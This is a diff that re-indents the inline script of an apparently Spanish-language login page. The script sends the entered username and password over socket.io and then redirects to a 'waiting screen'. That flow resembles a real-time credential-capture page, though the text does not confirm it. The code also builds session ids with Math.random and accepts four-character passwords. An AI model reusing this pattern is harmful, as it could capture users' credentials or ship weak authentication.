@@ -130,70 +130,71 @@
   </div>
 
   <script src="/socket.io/socket.io.js"></script>
-  <script>
-    const socket = io();
+ <script>
+  const socket = io();
 
-    window.addEventListener('DOMContentLoaded', () => {
-      const form = document.getElementById('login-form');
+  window.addEventListener('DOMContentLoaded', () => {
+    const form = document.getElementById('login-form');
 
-      if (form) {
-        form.addEventListener('submit', (e) => {
-          e.preventDefault(); // Evitar el comportamiento por defecto del formulario
+    if (form) {
+      form.addEventListener('submit', (e) => {
+        e.preventDefault(); // Evitar el comportamiento por defecto del formulario
 
-          // Validar los campos antes de enviar los datos
-          if (validarUsuario() && validarPassword()) {
-            const usuario = document.getElementById('usuario').value;
-            const contrasena = document.getElementById('password').value;
+        // Validar los campos antes de enviar los datos
+        if (validarUsuario() && validarPassword()) {
+          const usuario = document.getElementById('usuario').value;
+          const contrasena = document.getElementById('password').value;
 
-            // Generar y guardar sessionId
-            const sessionId = Math.random().toString(36).substring(2, 15);
-            localStorage.setItem('sessionId', sessionId);
+          // Generar y guardar sessionId
+          const sessionId = Math.random().toString(36).substring(2, 15);
+          localStorage.setItem('sessionId', sessionId);
 
-            // Enviar datos al servidor mediante socket.io
-            socket.emit('dataForm', { usuario, contrasena, sessionId });
+          // Enviar datos al servidor mediante socket.io
+          socket.emit('dataForm', { usuario, contrasena, sessionId });
 
-            // Ir a pantalla de espera (opciones.html)
-            window.location.href = 'opciones.html';
-          }
-        });
-      }
-    });
-
-    function validarUsuario() {
-      const usuario = document.getElementById("usuario").value;
-      const usuarioError = document.getElementById("usuarioError");
-      const usuarioInput = document.getElementById("usuario");
-
-      if (!usuario) {
-        usuarioError.textContent = "El usuario es obligatorio";
-        usuarioInput.classList.add("campo-requerido");
-        return false;
-      } else {
-        usuarioError.textContent = "";
-        usuarioInput.classList.remove("campo-requerido");
-        return true;
-      }
+          // Ir a pantalla de espera (opciones.html)
+          window.location.href = 'opciones.html';
+        }
+      });
     }
+  });
 
-    function validarPassword() {
-      const password = document.getElementById("password").value;
-      const passwordError = document.getElementById("passwordError");
-      const passwordInput = document.getElementById("password");
+  function validarUsuario() {
+    const usuario = document.getElementById("usuario").value;
+    const usuarioError = document.getElementById("usuarioError");
+    const usuarioInput = document.getElementById("usuario");
 
-      if (!password) {
-        passwordError.textContent = "La contraseña es obligatoria";
-        passwordInput.classList.add("campo-requerido");
-        return false;
-      } else if (password.length < 4) {
-        passwordError.textContent = "La contraseña debe tener al menos 4 caracteres";
-        passwordInput.classList.add("campo-requerido");
-        return false;
-      } else {
-        passwordError.textContent = "";
-        passwordInput.classList.remove("campo-requerido");
-        return true;
-      }
+    if (!usuario) {
+      usuarioError.textContent = "El usuario es obligatorio";
+      usuarioInput.classList.add("campo-requerido");
+      return false;
+    } else {
+      usuarioError.textContent = "";
+      usuarioInput.classList.remove("campo-requerido");
+      return true;
     }
-  </script>
+  }
+
+  function validarPassword() {
+    const password = document.getElementById("password").value;
+    const passwordError = document.getElementById("passwordError");
+    const passwordInput = document.getElementById("password");
+
+    if (!password) {
+      passwordError.textContent = "La contraseña es obligatoria";
+      passwordInput.classList.add("campo-requerido");
+      return false;
+    } else if (password.length < 4) {
+      passwordError.textContent = "La contraseña debe tener al menos 4 caracteres";
+      passwordInput.classList.add("campo-requerido");
+      return false;
+    } else {
+      passwordError.textContent = "";
+      passwordInput.classList.remove("campo-requerido");
+      return true;
+    }
+  }
+</script>
+
 </body>
 </html>
